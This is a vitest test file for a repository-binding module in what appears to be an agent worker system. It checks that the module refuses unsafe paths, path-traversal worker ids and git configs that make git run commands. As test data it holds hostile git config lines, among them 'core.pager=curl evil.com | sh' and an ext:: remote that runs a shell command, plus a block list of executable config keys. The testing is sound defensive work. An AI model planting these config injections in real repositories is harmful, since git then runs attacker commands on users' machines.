import { chmodSync, mkdtempSync, rmSync, writeFileSync } from "fs";
import { homedir, tmpdir } from "os";
import { join } from "path";
import { describe, it, expect, vi, afterAll } from "vitest";
import { bindRepository, createAllowlistReader, RepoDeps, repoInventory } from "./repos.js";
import { scopedConfigListZ } from "./config-list.fixtures.js";

// The scan bindRepository makes is the one a run makes (BP-517), and it asks git twice: once for
// `--local --list`, whose exit code says the checkout can be read at all, and once for the scoped,
// NUL-framed listing it judges. A fake that answered the second shape to both would hide the
// first, so each call gets the output git gives it.
function depsWith(over: Partial<{
  allowlist: string[];
  realpath: (p: string) => string;
  gitConfig: string;
  scope: string;
  toplevel: string;
  uid: number;
  mode: number;
  fileUid: number;
  workerId: string;
}> = {}): RepoDeps {
  // `--local --list` without `-z` prints `key=value` lines; only its exit code is read, but a
  // fixture that answers in the other call's wire format is the fixture lying about which call it
  // is (config-list.fixtures.ts's own rule).
  const readable = over.gitConfig ?? "";
  const scoped = scopedConfigListZ(over.gitConfig ?? "", over.scope ?? "local");
  const toplevel = over.toplevel;
  return {
    runner: {
      run: vi.fn(async (_cmd: string, args: string[]) => ({
        code: 0,
        stdout: args.includes("--show-toplevel")
          ? (toplevel ?? "/repo")
          : args.includes("--show-scope")
            ? scoped
            : readable,
        stderr: "",
        timedOut: false,
      })),
    },
    readAllowlist: () => JSON.stringify({ repos: over.allowlist ?? ["/repo"] }),
    realpath: over.realpath ?? ((p: string) => p),
    stat: () => ({ uid: over.fileUid ?? 501, mode: over.mode ?? 0o755 }),
    uid: over.uid ?? 501,
    workerId: over.workerId ?? "worker-1",
  };
}

describe("bindRepository", () => {
  it("accepts an allowlisted repository that is its own toplevel", async () => {
    const result = await bindRepository(depsWith(), "/repo");

    expect(result.ok).toBe(true);
    expect((result as { worktreeRoot: string }).worktreeRoot).toBe(join("/", "cp-worktrees", "worker-1"));
  });

  // Two worker processes running as the same OS user must not collide on the same worktree root —
  // the whole reason RepoDeps.workerId went from optional to required
  it("derives worktreeRoot from the given workerId, not the OS uid", async () => {
    const a = await bindRepository(depsWith({ workerId: "worker-a", uid: 501 }), "/repo");
    const b = await bindRepository(depsWith({ workerId: "worker-b", uid: 501 }), "/repo");

    expect((a as { worktreeRoot: string }).worktreeRoot).toBe(join("/", "cp-worktrees", "worker-a"));
    expect((b as { worktreeRoot: string }).worktreeRoot).toBe(join("/", "cp-worktrees", "worker-b"));
    expect((a as { worktreeRoot: string }).worktreeRoot).not.toBe((b as { worktreeRoot: string }).worktreeRoot);
  });

  // BP-327, belt and braces: registration.ts refuses a workerId that is not an ObjectId, and this
  // is the sink that would suffer if anything ever got past it. `join` normalises "..", so the
  // root has to be checked after it is computed, not before.
  it.each([
    "../../../../Users/owner/Library/LaunchAgents",
    "..",
    "../sibling",
    "/etc",
  ])("refuses a workerId that puts the worktree root outside cp-worktrees: %s", async (workerId) => {
    const result = await bindRepository(depsWith({ workerId }), "/repo");

    expect(result.ok).toBe(false);
    expect((result as { reason: string }).reason).toMatch(/outside/i);
  });

  it("still nests the worktree root under cp-worktrees for the ids the server actually mints", async () => {
    const result = await bindRepository(depsWith({ workerId: "6a7c686f70ed274cf658b1b3" }), "/repo");

    expect((result as { worktreeRoot: string }).worktreeRoot).toBe(
      join("/", "cp-worktrees", "6a7c686f70ed274cf658b1b3")
    );
  });

  it("refuses a path the operator never allowed", async () => {
    const result = await bindRepository(depsWith({ allowlist: ["/repo"] }), "/tmp/evil");

    expect(result.ok).toBe(false);
    expect((result as { reason: string }).reason).toMatch(/not approved on this machine/i);
  });

  // Allowlist a benign path, then point a symlink somewhere else
  it("refuses when the allowlisted path resolves elsewhere", async () => {
    const deps = depsWith({ allowlist: ["/repo"], realpath: () => "/tmp/evil" });

    expect((await bindRepository(deps, "/repo")).ok).toBe(false);
  });

  it.each([
    "core.pager=curl evil.com | sh",
    "core.fsmonitor=/tmp/x",
    "core.sshCommand=/tmp/x",
    "core.hooksPath=/tmp/hooks",
    "core.editor=/tmp/x",
    "core.gitProxy=/tmp/x",
    "sequence.editor=/tmp/x",
    "diff.external=/tmp/x",
    "filter.lfs.clean=/tmp/x",
    "filter.lfs.process=/tmp/x",
    "diff.mydriver.textconv=/tmp/x",
    "diff.mydriver.command=/tmp/x",
    "merge.mine.driver=/tmp/x",
    "credential.helper=!/tmp/x",
    "credential.https://github.com.helper=!/tmp/x",
    "remote.origin.receivepack=/tmp/x",
    "remote.origin.uploadpack=/tmp/x",
    "protocol.allow=always",
    "protocol.ext.allow=always",
    "protocol.ext.allow=user",
    "remote.origin.url=ext::/tmp/x",
    "alias.st=!/tmp/x",
    // What git runs to SIGN a commit. Neither a hook nor a filter, so every other rule here missed
    // it, and `git commit` ran it — measured on git 2.50.1 (BP-516 review).
    "gpg.program=/tmp/x",
    "gpg.openpgp.program=/tmp/x",
    "gpg.ssh.defaultKeyCommand=/tmp/x",
  ])("refuses a repository whose git config sets %s", async (line) => {
    const result = await bindRepository(depsWith({ gitConfig: `${line}\n` }), "/repo");

    expect(result.ok).toBe(false);
    expect((result as { reason: string }).reason).toMatch(/git config/i);
  });

  // The reproduction that matters most: neither key alone is a command, but together they make
  // git run one — this is what delivery.ts's own push would otherwise execute
  it("refuses a repository pairing a permissive protocol.allow with an ext:: remote", async () => {
    const gitConfig = "protocol.ext.allow=always\nremote.origin.url=ext::sh -c 'touch /tmp/pwned'\n";
    const result = await bindRepository(depsWith({ gitConfig }), "/repo");

    expect(result.ok).toBe(false);
    expect((result as { reason: string }).reason).toMatch(/git config/i);
  });

  // These sit in the same families as the dangerous keys above but hold no command, so refusing
  // them would reject ordinary Git-LFS and gitattributes repositories for no security benefit.
  // protocol.*.allow=never is the explicitly safe value — it reinforces ext's default, it does not
  // relax it — and must not be refused just because the key shape matches.
  it.each([
    "filter.lfs.required=true",
    "diff.d.binary=true",
    "merge.m.name=custom merge driver",
    "diff.mytype.xfuncname=^function",
    "protocol.allow=never",
    "protocol.ext.allow=never",
  ])("accepts a repository whose git config merely sets %s", async (line) => {
    const result = await bindRepository(depsWith({ gitConfig: `${line}\n` }), "/repo");

    expect(result.ok).toBe(true);
  });

  // toplevel is pinned to the proposed path so rule 6 (own toplevel) cannot also refuse and mask
  // whether the rule actually under test fired — depsWith()'s default toplevel is "/repo", which
  // none of these paths equal, so without the override every case here would "pass" vacuously.
  it.each([
    // Derived from homedir(), like the rule itself: hard-coding one machine's home meant this
    // case asserted nothing anywhere else, and CI on Linux was the first thing to notice
    [join(homedir(), ".ssh"), /sensitive/i],
    [join(homedir(), ".claude"), /sensitive/i],
    ["/etc", /sensitive/i],
    ["/private/etc/passwd", /sensitive/i],
    ["/tmp/evil", /sensitive/i],
    ["/private/tmp/evil", /sensitive/i],
    ["/repo/node_modules/x", /node_modules/i],
    ["relative/path", /absolute/i],
    ["/a/../b", /absolute/i],
  ])("refuses %s outright", async (path, reason) => {
    const result = await bindRepository(depsWith({ allowlist: [path], toplevel: path }), path);

    expect(result.ok).toBe(false);
    expect((result as { reason: string }).reason).toMatch(reason);
  });

  it("refuses a repository that is not its own toplevel", async () => {
    const deps = depsWith({ toplevel: "/repo-parent" });

    expect((await bindRepository(deps, "/repo")).ok).toBe(false);
  });

  it("refuses a repository owned by another user", async () => {
    expect((await bindRepository(depsWith({ fileUid: 0 }), "/repo")).ok).toBe(false);
  });

  it("refuses a group-writable repository", async () => {
    expect((await bindRepository(depsWith({ mode: 0o775 }), "/repo")).ok).toBe(false);
  });

  it("refuses an allowlist file readable by anyone else", async () => {
    const deps = depsWith();
    deps.readAllowlist = () => {
      throw new Error("~/.boardplanner/repos.json is readable by group or others");
    };

    const result = await bindRepository(deps, "/repo");

    expect(result.ok).toBe(false);
    expect((result as { reason: string }).reason).toMatch(/readable by group or others/);
  });

  // The two asymmetries BP-517 is about, and they are the reason bind time now runs the run's own
  // scan rather than a list of its own. Both bound here and were refused at run time instead —
  // where, since BP-504, the refusal quarantines the project rather than costing one task.
  it("refuses a checkout that reaches a config through include.path", async () => {
    const result = await bindRepository(
      depsWith({ gitConfig: "include.path=/tmp/whatever\n" }),
      "/repo"
    );

    expect(result.ok).toBe(false);
    expect((result as { reason: string }).reason).toMatch(/include\.path/);
  });

  // `--local --list` cannot see this scope at all, which is how the old rule missed it
  it("refuses an executable key in the per-worktree config", async () => {
    const result = await bindRepository(
      depsWith({ gitConfig: "core.pager=/tmp/x\n", scope: "worktree" }),
      "/repo"
    );

    expect(result.ok).toBe(false);
    expect((result as { reason: string }).reason).toMatch(/core\.pager \(worktree\)/);
  });

  // The operator's own machine is not judged here, and that is what makes the refusals above
  // narrow enough to ship: a credential helper in ~/.gitconfig is ordinary, and localGitEnv means
  // no call this worker makes reads it anyway (BP-516).
  it("binds a checkout whose only executable key is the operator's own global one", async () => {
    const result = await bindRepository(
      depsWith({ gitConfig: "credential.helper=!gh auth git-credential\n", scope: "global" }),
      "/repo"
    );

    expect(result.ok).toBe(true);
  });

  it("refuses a checkout whose config git would not answer for", async () => {
    const deps = depsWith();
    deps.runner.run = vi.fn(async (_cmd: string, args: string[]) => ({
      code: args.includes("--show-toplevel") ? 0 : 128,
      stdout: args.includes("--show-toplevel") ? "/repo" : "",
      stderr: "fatal: bad config line 1",
      timedOut: false,
    }));

    const result = await bindRepository(deps, "/repo");

    expect(result.ok).toBe(false);
    expect((result as { reason: string }).reason).toMatch(/could not read git config/i);
  });

  // A hostile system-wide gitconfig would otherwise reach every invocation this module makes, and
  // so would a filter in the operator's own ~/.gitconfig — which the agent's Write reaches (BP-516)
  it("neutralises system, global and repository git config on every call it makes", async () => {
    const deps = depsWith();
    await bindRepository(deps, "/repo");

    for (const call of (deps.runner.run as ReturnType<typeof vi.fn>).mock.calls) {
      expect(call[1]).toEqual(expect.arrayContaining(["-c", "core.pager=cat"]));
      expect(call[2].env.GIT_CONFIG_NOSYSTEM).toBe("1");
      expect(call[2].env.GIT_CONFIG_GLOBAL).toBe("/dev/null");
    }
  });
});

describe("createAllowlistReader", () => {
  const dir = mkdtempSync(join(tmpdir(), "cp-repos-test-"));

  afterAll(() => {
    rmSync(dir, { recursive: true, force: true });
  });

  it("reads repos.json when only its owner can read it", () => {
    const path = join(dir, "repos.json");
    writeFileSync(path, JSON.stringify({ repos: ["/repo"] }));
    chmodSync(path, 0o600);

    expect(createAllowlistReader(dir)()).toBe(JSON.stringify({ repos: ["/repo"] }));
  });

  it("refuses repos.json readable by group or others, the same as a loose SSH key", () => {
    const path = join(dir, "repos.json");
    writeFileSync(path, JSON.stringify({ repos: ["/repo"] }));
    chmodSync(path, 0o644);

    expect(() => createAllowlistReader(dir)()).toThrow(/readable by group or others/);
  });
});

// Reporting [] for a fault made the server wipe its stored inventory, leaving a worker that looked
// live, enabled and error-free while claiming nothing — and, for a mode-644 repos.json, never
// self-healing. The reason has to survive as a reason.
describe("repoInventory", () => {
  const runner = (remote: string) => ({
    run: async () => ({ code: 0, stdout: remote, stderr: "", timedOut: false }),
  });

  it("reports each allowed checkout with the origin it resolves to", async () => {
    const result = await repoInventory({
      runner: runner("git@github.com:owner/repo.git") as never,
      readAllowlist: () => JSON.stringify({ repos: ["/a"] }),
    });

    expect(result).toEqual({
      ok: true,
      repos: [{ remote: "git@github.com:owner/repo.git", path: "/a" }],
    });
  });

  it("distinguishes a file it could not read from a machine with nothing listed", async () => {
    const unreadable = await repoInventory({
      runner: runner("x") as never,
      readAllowlist: () => {
        throw new Error("is readable by group or others (mode 644); run chmod 600 on it");
      },
    });
    const empty = await repoInventory({
      runner: runner("x") as never,
      readAllowlist: () => JSON.stringify({ repos: [] }),
    });

    expect(unreadable.ok).toBe(false);
    expect((unreadable as { reason: string }).reason).toMatch(/mode 644/);
    expect(empty).toEqual({ ok: true, repos: [] });
  });

  // The `for…of` used to sit outside the try, so this threw and took out the whole refresh
  it("refuses a repos.json whose repos is not an array, instead of throwing", async () => {
    const result = await repoInventory({
      runner: runner("x") as never,
      readAllowlist: () => JSON.stringify({ repos: { a: 1 } }),
    });

    expect(result).toMatchObject({ ok: false });
  });

  it("skips a checkout with no origin without losing the rest", async () => {
    let call = 0;
    const mixed = {
      run: async () => {
        call += 1;
        return call === 1
          ? { code: 128, stdout: "", stderr: "no origin", timedOut: false }
          : { code: 0, stdout: "git@github.com:owner/second.git", stderr: "", timedOut: false };
      },
    };

    const result = await repoInventory({
      runner: mixed as never,
      readAllowlist: () => JSON.stringify({ repos: ["/first", "/second"] }),
    });

    expect(result).toEqual({
      ok: true,
      repos: [{ remote: "git@github.com:owner/second.git", path: "/second" }],
    });
  });
});
